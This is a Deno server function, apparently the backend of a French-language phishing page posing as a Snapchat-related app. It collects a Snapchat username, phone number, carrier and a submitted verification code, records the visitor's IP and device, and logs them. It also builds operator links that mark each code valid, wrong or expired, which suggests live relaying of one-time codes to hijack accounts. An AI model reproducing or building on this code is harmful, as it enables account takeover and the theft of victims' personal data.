import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { snapchat, telephone, operateur, code, submissionId } = await req.json();

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const userAgent = req.headers.get("user-agent") || "";
  
  let browser = "Inconnu";
  let device = "Inconnu";
  
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Edge")) browser = "Edge";
  
  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
  else if (userAgent.includes("iPad")) device = "📱 Tablette";
  else device = "💻 PC";
  
  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";

  // These links call triggerSendCode with the action param
  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;

  // Create a simple blacklist URL with base64 encoding
  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;

  // Log code entry action only, no Discord notification (submitted already sent one)
  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "code_sent",
    details: { browser, device, ip, code },
    timestamp: new Date().toISOString()
  }).catch(() => {});

  return Response.json({ ok: true });
});